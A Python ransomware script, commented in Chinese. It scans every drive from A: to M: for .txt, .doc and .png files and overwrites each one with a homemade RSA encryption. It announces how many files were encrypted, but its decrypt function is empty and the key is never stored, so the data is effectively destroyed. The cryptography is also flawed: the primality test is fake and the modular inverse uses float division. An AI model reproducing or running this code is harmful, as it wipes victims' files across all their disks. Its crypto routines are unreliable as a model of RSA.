import os,sys
import traceback  
import random
def RSA_decrypt(d,n,tep):
    pass
def RSA_encrypt(plaintext,e,n):#对明文RSA加密返回密文
    ciphertext=[pow(c,e,n).to_bytes(8, byteorder='big', signed=False) for c in plaintext]
    return b''.join(ciphertext)
def AKS(a,n):#AKS素性检验
    if pow(17-a,n,n)==pow(17,n,n)-(a%n):
        return 1
    else:
        return 0
def big_rand():#生成大素数
    flag=0
    l,u=2**16,2**32
    while not flag:
        n=random.randrange(l,u)
        if any([n%x==0 for x in[2,3,5,7,13]]):
            continue
        flag=AKS(2,n)
    return n
    pass
def get_e(e_n):#与欧拉数e_n互质的e
    flag=1
    while flag:
        e=random.randrange(e_n)
        if coprime(e,e_n)==(1,0):
            flag=0
    return e
def euclid(a,b):#扩展欧几里得算法求逆元
    lx=[1,0,b]
    ly=[0,1,a]
    while ly[2]!=1:
        if ly[2]==0:
            return 0
        q=lx[2]/ly[2]
        lt=[lx[i]-ly[i]*q for i in range(3)]
        lx=ly
        ly=lt
    return ly[1]%b
def coprime(a,b):#判断互质
    if a<b:
        a,b=b,a
    while b!=0:
        t=a%b
        a=b
        b=t
    return (a,b)
def get_key():#生成公钥和秘钥
    p=big_rand()
    q=big_rand()
    n=p*q
    e_n=n-p-q+1
    e=get_e(e_n)
    d=euclid(e,e_n)
    return [e,n,e_n,d,p,q]
def IterateFiles(directory,formlist=['txt','doc','png']):#之前从网络收藏的遍历模块，获得目标加密文件
    assert os.path.isdir(directory),'make sure directory argument should be a directory'
    result = []
    for root,dirs,files in os.walk(directory, topdown=True):
        for fl in files:
            if fl.split('.')[-1] in formlist:
                result.append(os.path.join(root,fl))
    return result
def drives():#获取存在的盘符
    drive_list = []
    for drive in range(ord('A'), ord('N')):
        if os.path.exists(chr(drive) + ':'):
            drive_list.append(chr(drive)+":\\")
    return drive_list
def walk_drivers(formlist=['txt','doc','png']):#遍历全部磁盘文件获取加密目标绝对地址的list
    driver_list=drives() 
    files=[]
    for driver in driver_list:
        files+=IterateFiles(driver,formlist=['txt','doc','png'])
    if sys.argv[0] in files:
        files.remove(sys.argv[0])
    print('There are '+str(len(files))+'target files\n')
    return files
def encrypt(filename,k):
    print('encrypting :'+filename)
    try:
        with open(filename,'rb') as f:
            t=f.read()
        c=RSA_encrypt(t,k[0],k[1])#加密
        with open(filename,'wb') as f:
            f.write(c)#覆盖明文写入密文
    except:
        traceback.print_exc()
def attack(formlist=['txt','doc','png']):
    files=walk_drivers(formlist)
    k=get_key()
    print('Got key!')
    for filename in files:
        encrypt(filename,k)
    return len(files)
if __name__ == '__main__':
    l=attack()
    print('Dangerous! '+str(l)+' files have ben encrypted!')
    os.system("pause")
